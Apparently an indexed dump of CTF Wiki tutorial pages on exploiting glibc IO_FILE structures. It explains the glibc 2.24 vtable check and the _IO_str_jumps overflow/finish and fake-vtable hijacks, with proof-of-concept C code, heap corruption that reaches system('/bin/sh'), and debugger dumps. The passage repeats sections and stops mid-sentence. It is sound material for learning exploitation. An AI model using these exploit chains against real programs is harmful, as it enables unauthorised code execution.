0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 After that, the read data of scanf will be written to the location of 0x7ffff7dd2740. 0x7ffff7dd2740 <buf>: 0x00000a6161616161 0x0000000000000000 0x7ffff7dd2750 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2760 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2770 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2780 <buffer>: 0x0000000000000000 0x0000000000000000 _IO_str_jumps -> overflow \u00b6 libc is not only _IO_file_jumps such a vtable , but also a _IO_str_jumps , this vtable is not in the check range. const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY , JUMP_INIT ( finish , _IO_str_finish ), JUMP_INIT ( overflow , _IO_str_overflow ), JUMP_INIT ( underflow , _IO_str_underflow ), JUMP_INIT ( uflow , _IO_default_uflow ), JUMP_INIT ( pbackfail , _IO_str_pbackfail ), JUMP_INIT ( xsputn , _IO_default_xsputn ), JUMP_INIT ( xsgetn , _IO_default_xsgetn ), JUMP_INIT ( seekoff , _IO_str_seekoff ), JUMP_INIT ( seekpos , _IO_default_seekpos ), JUMP_INIT ( setbuf , _IO_default_setbuf ), JUMP_INIT ( sync , _IO_default_sync ), JUMP_INIT ( doallocate , _IO_default_doallocate ), JUMP_INIT ( read , _IO_default_read ), JUMP_INIT ( write , _IO_default_write ), JUMP_INIT ( seek , _IO_default_seek ), JUMP_INIT ( close , _IO_default_close ), JUMP_INIT ( stat , _IO_default_stat ), JUMP_INIT ( showmanyc , _IO_default_showmanyc ), JUMP_INIT ( imbue , _IO_default_imbue ) }; If we can set the vtable of the file pointer to _IO_str_jumps , we can call a different file manipulation function. Here is an example of _IO_str_overflow : int _IO_str_overflow ( _IO_FILE * fp , int c ) { int flush_only = c == EOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) // pass return flush_only ? 0 : EOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _IO_write_ptr = fp -> _IO_read_ptr ; fp -> _IO_read_ptr = fp -> _IO_read_end ; } pos = fp -> _IO_write_ptr - fp -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_blen ( fp ) + flush_only )) // should in { if ( fp -> _flags & _IO_USER_BUF ) /* not allowed to enlarge */ // pass return EOF ; else { char * new_buf ; char * old_buf = fp -> _IO_buf_base ; size_t old_blen = _IO_blen ( fp ); _IO_size_t new_size = 2 * old_blen + 100 ; If ( new_size & lt ; old_blen ) //pass will generally pass return EOF ; new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); //target [fp+0xe0] if ( new_buf == NULL ) { /* __ferror(fp) = 1; */ return EOF ; } if ( old_buf ) { memcpy ( new_buf , old_buf , old_blen ); ( * (( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( old_buf ); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp -& gt ; _ IO_buf_base = NULL ; } memset ( new_buf + old_blen , '\\0' , new_size - old_blen ); _IO_setb ( fp , new_buf , new_buf + new_size , 1 ); fp -> _IO_read_base = new_buf + ( fp -> _IO_read_base - old_buf ); fp -> _IO_read_ptr = new_buf + ( fp -> _IO_read_ptr - old_buf ); fp -> _IO_read_end = new_buf + ( fp -> _IO_read_end - old_buf ); fp -> _IO_write_ptr = new_buf + ( fp -> _IO_write_ptr - old_buf ); fp -> _IO_write_base = new_buf ; fp -> _IO_write_end = fp -> _IO_buf_end ; } } if ( ! flush_only ) * fp -> _IO_write_ptr ++ = ( unsigned char ) c ; if ( fp -> _IO_write_ptr > fp -> _IO_read_end ) fp -> _IO_read_end = fp -> _IO_write_ptr ; return c ; } libc_hidden_def ( _IO_str_overflow ) Use the following code to hijack the program flow new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); Several conditions bypass: `1. fp->_flags & _IO_NO_WRITES is false 2. (pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1)) `3. fp->_flags & _IO_USER_BUF(0x01) is false. `4. 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 cannot be negative `5. new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100; should point to the address corresponding to the /bin/sh string. `6. fp+0xe0 points to the system address. structure: _flags = 0 _IO_write_base = 0 _IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 _IO_buf_end = (binsh_in_libc_addr -100) / 2 _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_jumps - 0x18 Example \u00b6 Modified how2heap's houseoforange code, you can debug it yourself. #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char * ptr ); int main () { char * p1 , * p2 ; size_t io_list_all , * top ; // unsorted bin attack p1 = malloc ( 0x400 -16 ); top = ( size_t * ) ( ( char * ) p1 + 0x400 - 16 ); top [ 1 ] = 0xc01 ; p2 = malloc ( 0x1000 ); io_list_all = top [ 2 ] + 0x9a8 ; top [ 3 ] = io_list_all - 0x10 ; // _IO_str_overflow conditions char binsh_in_libc [] = \"/bin/sh \\x00 \" ; // we can found \"/bin/sh\" in libc, here i create it in stack // top[0] = ~1; // top[0] &= ~8; top [ 0 ] = 0 ; top [ 4 ] = 0 ; // write_base top [ 5 ] = (( size_t ) & binsh_in_libc -100 ) / 2 + 1 ; // write_ptr top [ 7 ] = 0 ; // buf_base top [ 8 ] = top [ 5 ] - 1 ; // buf_end // house_of_orange conditions top [ 1 ] = 0x61 ; top [ 20 ] = ( size_t ) & top [ 18 ]; top [ 21 ] = 2 ; top [ 22 ] = 3 ; top [ 24 ] = -1 ; Top [ 27 ] = ( size_t ) stdin - 0x3868-0x18 ; // _IO_str_jumps address top [ 28 ] = ( size_t ) & winner ; /* Finally, trigger the whole chain by calling malloc */ malloc ( 10 ); return 0 ; } int winner ( char * ptr ) { System ( ptr ); return 0 ; } _IO_str_jumps -> finish \u00b6 The principle is similar to _IO_str_jumps -> overflow above void _IO_str_finish ( _IO_FILE * fp , int dummy ) { if ( fp -> _IO_buf_base && ! ( fp -> _flags & _IO_USER_BUF )) ((( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( fp -> _IO_buf_base ); //[fp+0xe8] fp -& gt ; _ IO_buf_base = NULL ; _IO_default_finish ( fp , 0 ); } condition: _IO_buf_base is not empty _flags & _IO_USER_BUF(0x01) is false Constructed as follows: _flags = ( binsh_in_libc + 0x10 ) & ~1 _IO_buf_base = binsh_addr _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_finish - 0x18 fp+0xe8 -> system_addr Example \u00b6 Modified how2heap's houseoforange code, you can debug it yourself. #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char * ptr ); int main () { char * p1 , * p2 ; size_t io_list_all , * top ; // unsorted bin attack p1 = malloc ( 0x400 -16 ); top = ( size_t * ) ( ( char * ) p1 + 0x400 - 16 ); top [ 1 ] = 0xc01 ; p2 = malloc ( 0x1000 ); io_list_all = top [ 2 ] + 0x9a8 ; top [ 3 ] = io_list_all - 0x10 ; // _IO_str_finish conditions char binsh_in_libc [] = \"/bin/sh \\x00 \" ; // we can found \"/bin/sh\" in libc, here i create it in stack top [ 0 ] = (( size_t ) & binsh_in_libc + 0x10 ) & ~ 1 ; top [ 7 ] = (( size_t ) & binsh_in_libc ); // buf_base // house_of_orange conditions top [ 1 ] = 0x61 ; top [ 5 ] = 0x1 ; //_IO_write_ptr top [ 20 ] = ( size_t ) & top [ 18 ]; top [ 21 ] = 2 ; top [ 22 ] = 3 ; top [ 24 ] = -1 ; top [ 27 ] = ( size_t ) stdin - 0x33f0 - 0x18 ; top [ 29 ] = ( size_t ) & winner ; top [ 30 ] = ( size_t ) & top [ 30 ]; malloc ( 10 ); return 0 ; } int winner ( char * ptr ) { System ( ptr ); return 0 ; }","title":"Use of IO_FILE Under Glibc 2.24"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#glibc-224-utilization-of-io_file","text":"","title":"glibc 2.24 Utilization of IO_FILE"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#introduction","text":"In the 2.24 version of glibc, the new detection of vtable hijacking for IO_FILE_plus, glibc The validity of the vtable address is checked first before calling the virtual function. First, it will verify whether the vtable is in the _IO_vtable section. If the condition is met, it will be executed normally. Otherwise, _IO_vtable_check will be called for further checking. /* Check if unknown vtable pointers are permitted; otherwise, terminate the process. */ void _IO_vtable_check ( void ) attribute_hidden ; /* Perform vtable pointer validation. If validation fails, terminate the process. */ static inline const struct _IO_jump_t * IO_validate_vtable ( const struct _IO_jump_t * vtable ) { /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables ; uintptr_t ptr = ( uintptr_t ) vtable ; uintptr_t offset = ptr - ( uintptr_t ) __start___libc_IO_vtables ; if ( __glibc_unlikely ( offset >= section_length )) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable ; } Calculate section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; , and then determine the offset of vtable - __start___libc_IO_vtables. If the offset is greater than section_length, ie greater than __stop___libc_IO_vtables - __start___libc_IO_vtables then the _IO_vtable_check() function will be called. void attribute_hidden _IO_vtable_check ( void ) { #ifdef SHARED /* Honor the compatibility flag. */ void ( * flag ) ( void ) = atomic_load_relaxed ( & IO_accept_foreign_vtables ); #ifdef PTR_DEMANGLE PTR_DEMANGLE ( flag ); #endif if ( flag == & _IO_vtable_check ) return ; /* In case this libc copy is in a non-default namespace, we always need to accept foreign vtables because there is always a possibility that FILE * objects are passed across the linking boundary. */ { Dl_info di ; struct link_map * l ; if ( _dl_open_hook != NULL || ( _dl_addr ( _IO_vtable_check , & amp ; di , & amp ; l , NULL ) ! = 0 && l -> l_ns != LM_ID_BASE )) return ; } #else /* !SHARED */ /* We cannot perform vtable validation in the static dlopen case because FILE * handles might be passed back and forth across the boundary. Therefore, we disable checking in this case. */ if ( __dlopen != NULL ) return ; #endif __libc_fatal ( \"Fatal error: glibc detected an invalid stdio handle \\n \" ); } If the vtable is illegal, then abort is raised. The check here makes it difficult to implement the technology that used vtable in the past.","title":"Introduction"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#new-utilization-technology","text":"","title":"New utilization technology"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#fileno-use-of-buffers","text":"After the vtable is difficult to exploit, the focus of interest is transferred from the vtable to the domain inside the _IO_FILE structure. As mentioned earlier, _IO_FILE is created and responsible for maintaining some related information when using the standard IO library. Some of the fields are used to write addresses or read addresses when calling functions such as fwrite and fread. If you can control these data, Any address write or arbitrary address read can be implemented. struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; int _flags2; _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ }; Because the process contains the system default three file streams stdin\\stdout\\stderr, this method can not use the file operation in the process, and can be used by scanf\\printf. In _IO_FILE, _IO_buf_base indicates the start address of the operation, and _IO_buf_end indicates the end address. By controlling these two data, the operation of controlling read and write can be realized.","title":"fileno Use of buffers"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#example","text":"Simply observe the effect of _IO_FILE on calling scanf #include \"stdio.h\" char buf[100]; int main() { char stack_buf[100]; scanf(\"%s\",stack_buf); scanf(\"%s\",stack_buf); } The content of stdin has not been initialized until the first time the executable is used. 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2088 0x0000000000000000 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 <== vtable After calling scanf, you can see that the fields _IO_read_ptr, _IO_read_base, _IO_read_end, _IO_buf_base, _IO_buf_end are initialized. 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 <_IO_2_1_stdin_+48>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x0000000000602410 0x0000000000000000 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 Further thinking can be found that the memory initialized by stdin is actually allocated on the heap. The base address of the heap here is 0x602000, because there is no heap allocation before, so the address of the buffer is also 0x602010. Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/1/t1 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/1/t1 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/1/t1 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] The allocated heap size is 0x400 bytes, which corresponds to _IO_buf_base~_IO_buf_end After writing, you can see that we have written data in the buffer, and then the buffer in the destination address stack will also write data. 0x602000: 0x0000000000000000 0x0000000000000411 &lt;== allocate 0x400 size 0x602010: 0x000000000a333231 0x0000000000000000 &lt;== buffering data 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 Next we try to modify _IO_buf_base to achieve arbitrary address reading and writing, the address of the global buffer buf is 0x7ffff7dd2740. Modify _IO_buf_base and _IO_buf_end to the address of buffer buf 0x7ffff7dd18e0 <_IO_2_1_stdin_>: 0x00000000fbad2288 0x0000000000602013 0x7ffff7dd18f0 <_IO_2_1_stdin_+16>: 0x0000000000602014 0x0000000000602010 0x7ffff7dd1900 <_IO_2_1_stdin_+32>: 0x0000000000602010 0x0000000000602010 0x7ffff7dd1910 &lt;_IO_2_1_stdin_ + 48&gt;: 0x0000000000602010 0x00007ffff7dd2740 &lt;== _IO_buf_base 0x7ffff7dd1920 <_IO_2_1_stdin_+64>: 0x00007ffff7dd27c0 0x0000000000000000 <== _IO_buf_end 0x7ffff7dd1930 <_IO_2_1_stdin_+80>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1940 <_IO_2_1_stdin_+96>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1950 <_IO_2_1_stdin_+112>: 0x0000000000000000 0xffffffffffffffff 0x7ffff7dd1960 <_IO_2_1_stdin_+128>: 0x0000000000000000 0x00007ffff7dd3790 0x7ffff7dd1970 <_IO_2_1_stdin_+144>: 0xffffffffffffffff 0x0000000000000000 0x7ffff7dd1980 <_IO_2_1_stdin_+160>: 0x00007ffff7dd19c0 0x0000000000000000 0x7ffff7dd1990 <_IO_2_1_stdin_+176>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd19a0 <_IO_2_1_stdin_+192>: 0x00000000ffffffff 0x0000000000000000 0x7ffff7dd19b0 <_IO_2_1_stdin_+208>: 0x0000000000000000 0x00007ffff7dd06e0 After that, the read data of scanf will be written to the location of 0x7ffff7dd2740. 0x7ffff7dd2740 <buf>: 0x00000a6161616161 0x0000000000000000 0x7ffff7dd2750 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2760 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2770 <buffer>: 0x0000000000000000 0x0000000000000000 0x7ffff7dd2780 <buffer>: 0x0000000000000000 0x0000000000000000","title":"Example"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-overflow","text":"libc is not only _IO_file_jumps such a vtable , but also a _IO_str_jumps , this vtable is not in the check range. const struct _IO_jump_t _IO_str_jumps libio_vtable = { JUMP_INIT_DUMMY , JUMP_INIT ( finish , _IO_str_finish ), JUMP_INIT ( overflow , _IO_str_overflow ), JUMP_INIT ( underflow , _IO_str_underflow ), JUMP_INIT ( uflow , _IO_default_uflow ), JUMP_INIT ( pbackfail , _IO_str_pbackfail ), JUMP_INIT ( xsputn , _IO_default_xsputn ), JUMP_INIT ( xsgetn , _IO_default_xsgetn ), JUMP_INIT ( seekoff , _IO_str_seekoff ), JUMP_INIT ( seekpos , _IO_default_seekpos ), JUMP_INIT ( setbuf , _IO_default_setbuf ), JUMP_INIT ( sync , _IO_default_sync ), JUMP_INIT ( doallocate , _IO_default_doallocate ), JUMP_INIT ( read , _IO_default_read ), JUMP_INIT ( write , _IO_default_write ), JUMP_INIT ( seek , _IO_default_seek ), JUMP_INIT ( close , _IO_default_close ), JUMP_INIT ( stat , _IO_default_stat ), JUMP_INIT ( showmanyc , _IO_default_showmanyc ), JUMP_INIT ( imbue , _IO_default_imbue ) }; If we can set the vtable of the file pointer to _IO_str_jumps , we can call a different file manipulation function. Here is an example of _IO_str_overflow : int _IO_str_overflow ( _IO_FILE * fp , int c ) { int flush_only = c == EOF ; _IO_size_t pos ; if ( fp -> _flags & _IO_NO_WRITES ) // pass return flush_only ? 0 : EOF ; if (( fp -> _flags & _IO_TIED_PUT_GET ) && ! ( fp -> _flags & _IO_CURRENTLY_PUTTING )) { fp -> _flags |= _IO_CURRENTLY_PUTTING ; fp -> _IO_write_ptr = fp -> _IO_read_ptr ; fp -> _IO_read_ptr = fp -> _IO_read_end ; } pos = fp -> _IO_write_ptr - fp -> _IO_write_base ; if ( pos >= ( _IO_size_t ) ( _IO_blen ( fp ) + flush_only )) // should in { if ( fp -> _flags & _IO_USER_BUF ) /* not allowed to enlarge */ // pass return EOF ; else { char * new_buf ; char * old_buf = fp -> _IO_buf_base ; size_t old_blen = _IO_blen ( fp ); _IO_size_t new_size = 2 * old_blen + 100 ; If ( new_size & lt ; old_blen ) //pass will generally pass return EOF ; new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); //target [fp+0xe0] if ( new_buf == NULL ) { /* __ferror(fp) = 1; */ return EOF ; } if ( old_buf ) { memcpy ( new_buf , old_buf , old_blen ); ( * (( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( old_buf ); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp -& gt ; _ IO_buf_base = NULL ; } memset ( new_buf + old_blen , '\\0' , new_size - old_blen ); _IO_setb ( fp , new_buf , new_buf + new_size , 1 ); fp -> _IO_read_base = new_buf + ( fp -> _IO_read_base - old_buf ); fp -> _IO_read_ptr = new_buf + ( fp -> _IO_read_ptr - old_buf ); fp -> _IO_read_end = new_buf + ( fp -> _IO_read_end - old_buf ); fp -> _IO_write_ptr = new_buf + ( fp -> _IO_write_ptr - old_buf ); fp -> _IO_write_base = new_buf ; fp -> _IO_write_end = fp -> _IO_buf_end ; } } if ( ! flush_only ) * fp -> _IO_write_ptr ++ = ( unsigned char ) c ; if ( fp -> _IO_write_ptr > fp -> _IO_read_end ) fp -> _IO_read_end = fp -> _IO_write_ptr ; return c ; } libc_hidden_def ( _IO_str_overflow ) Use the following code to hijack the program flow new_buf = ( char * ) ( * (( _IO_strfile * ) fp ) -> _s . _allocate_buffer ) ( new_size ); Several conditions bypass: `1. fp->_flags & _IO_NO_WRITES is false 2. (pos = fp->_IO_write_ptr - fp->_IO_write_base) >= ((fp->_IO_buf_end - fp->_IO_buf_base) + flush_only(1)) `3. fp->_flags & _IO_USER_BUF(0x01) is false. `4. 2*(fp->_IO_buf_end - fp->_IO_buf_base) + 100 cannot be negative `5. new_size = 2 * (fp->_IO_buf_end - fp->_IO_buf_base) + 100; should point to the address corresponding to the /bin/sh string. `6. fp+0xe0 points to the system address. structure: _flags = 0 _IO_write_base = 0 _IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 _IO_buf_end = (binsh_in_libc_addr -100) / 2 _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_jumps - 0x18","title":"_IO_str_jumps -&gt; overflow"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#example_1","text":"Modified how2heap's houseoforange code, you can debug it yourself. #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char * ptr ); int main () { char * p1 , * p2 ; size_t io_list_all , * top ; // unsorted bin attack p1 = malloc ( 0x400 -16 ); top = ( size_t * ) ( ( char * ) p1 + 0x400 - 16 ); top [ 1 ] = 0xc01 ; p2 = malloc ( 0x1000 ); io_list_all = top [ 2 ] + 0x9a8 ; top [ 3 ] = io_list_all - 0x10 ; // _IO_str_overflow conditions char binsh_in_libc [] = \"/bin/sh \\x00 \" ; // we can found \"/bin/sh\" in libc, here i create it in stack // top[0] = ~1; // top[0] &= ~8; top [ 0 ] = 0 ; top [ 4 ] = 0 ; // write_base top [ 5 ] = (( size_t ) & binsh_in_libc -100 ) / 2 + 1 ; // write_ptr top [ 7 ] = 0 ; // buf_base top [ 8 ] = top [ 5 ] - 1 ; // buf_end // house_of_orange conditions top [ 1 ] = 0x61 ; top [ 20 ] = ( size_t ) & top [ 18 ]; top [ 21 ] = 2 ; top [ 22 ] = 3 ; top [ 24 ] = -1 ; Top [ 27 ] = ( size_t ) stdin - 0x3868-0x18 ; // _IO_str_jumps address top [ 28 ] = ( size_t ) & winner ; /* Finally, trigger the whole chain by calling malloc */ malloc ( 10 ); return 0 ; } int winner ( char * ptr ) { System ( ptr ); return 0 ; }","title":"Example"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-finish","text":"The principle is similar to _IO_str_jumps -> overflow above void _IO_str_finish ( _IO_FILE * fp , int dummy ) { if ( fp -> _IO_buf_base && ! ( fp -> _flags & _IO_USER_BUF )) ((( _IO_strfile * ) fp ) -> _s . _free_buffer ) ( fp -> _IO_buf_base ); //[fp+0xe8] fp -& gt ; _ IO_buf_base = NULL ; _IO_default_finish ( fp , 0 ); } condition: _IO_buf_base is not empty _flags & _IO_USER_BUF(0x01) is false Constructed as follows: _flags = ( binsh_in_libc + 0x10 ) & ~1 _IO_buf_base = binsh_addr _freeres_list = 0x2 _freeres_buf = 0x3 _mode = -1 vtable = _IO_str_finish - 0x18 fp+0xe8 -> system_addr","title":"_IO_str_jumps -&gt; finish"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#example_2","text":"Modified how2heap's houseoforange code, you can debug it yourself. #include <stdio.h> #include <stdlib.h> #include <string.h> int winner ( char * ptr ); int main () { char * p1 , * p2 ; size_t io_list_all , * top ; // unsorted bin attack p1 = malloc ( 0x400 -16 ); top = ( size_t * ) ( ( char * ) p1 + 0x400 - 16 ); top [ 1 ] = 0xc01 ; p2 = malloc ( 0x1000 ); io_list_all = top [ 2 ] + 0x9a8 ; top [ 3 ] = io_list_all - 0x10 ; // _IO_str_finish conditions char binsh_in_libc [] = \"/bin/sh \\x00 \" ; // we can found \"/bin/sh\" in libc, here i create it in stack top [ 0 ] = (( size_t ) & binsh_in_libc + 0x10 ) & ~ 1 ; top [ 7 ] = (( size_t ) & binsh_in_libc ); // buf_base // house_of_orange conditions top [ 1 ] = 0x61 ; top [ 5 ] = 0x1 ; //_IO_write_ptr top [ 20 ] = ( size_t ) & top [ 18 ]; top [ 21 ] = 2 ; top [ 22 ] = 3 ; top [ 24 ] = -1 ; top [ 27 ] = ( size_t ) stdin - 0x33f0 - 0x18 ; top [ 29 ] = ( size_t ) & winner ; top [ 30 ] = ( size_t ) & top [ 30 ]; malloc ( 10 ); return 0 ; } int winner ( char * ptr ) { System ( ptr ); return 0 ; }","title":"Example"},{"location":"pwn/linux/io_file/fake-vtable-exploit/","text":"\u5047\u9020vtable hijack program flow \u00b6 Introduction \u00b6 Earlier we introduced the file stream feature (FILE) in Linux. We can see that some common IO operation functions in Linux need to be processed through the FILE structure. In particular, there is a vtable in the _IO_FILE_plus structure, and some functions will fetch the pointers in the vtable for calling. Therefore, the central idea of the fake vtable hijacking process is to implement the vtable of _IO_FILE_plus by pointing the vtable to the memory we control and placing the function pointer in it. Therefore, vtable hijacking is divided into two types. One is to directly rewrite the function pointer in the vtable, which can be realized by writing at any address. The other is to overwrite the vtable pointer to the memory we control, and then arrange the function pointer in it. Practice \u00b6 Here is a demonstration of the pointer in the vtable, first need to know where _IO_FILE_plus is located, in the case of fopen is located in the heap memory, for stdin\\stdout\\stderr is located in libc.so. int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(\"call 0x41414141\"); } The address of the vtable is obtained according to the offset of the vtable at _IO_FILE_plus, and the offset is 0xd8 under the 64-bit system. After that, you need to find out which function in the vtable is called by the IO function to be hijacked. About the IO function call vtable has been given in the FILE structure introduction section, know that printf will call xsputn in the vtable, and xsputn is the eighth item in the vtable can be written to this pointer for hijacking. And when the vtable function such as xsputn is called, the first parameter passed in is actually the corresponding IO_FILE_plus address. For example, this example calls printf, and the first parameter passed to the vtable is the address of _IO_2_1_stdout . Use this to pass arguments to the hijacked vtable function, such as #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(\"123.txt\",\"rw\"); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable memcopy(fp,\"sh\",3); vtable_ptr [7] = system_ptr // xsputn fwrite(\"hi\",2,1,fp); } However, under the current libc2.23 version, the vtable located in the libc data segment cannot be written. However, it can still be exploited by forging vtables in controllable memory. #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(\"123.txt\",\"rw\"); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,\"sh\",3); fake_vtable[7]=system_ptr; //xsputn fwrite(\"hi\",2,1,fp); } We first allocate a memory to store the fake vtable, then modify the _IO_FILE_plus vtable pointer to point to this memory. Because the pointer in the vtable we are placing the address of the system function, we need to pass the parameter \"/bin/sh\" or \"sh\". Because the function in the vtable will call the corresponding _IO_FILE_plus pointer as the first parameter, so here we write \"sh\" to the _IO_FILE_plus header. Subsequent calls to fwrite will execute system(\"sh\") via our fake vtable. Similarly, if _IO_FILE created by fopen and other functions does not exist in the program, you can also select _IO_FILE located in libc.so such as stdin\\stdout\\stderr. These streams 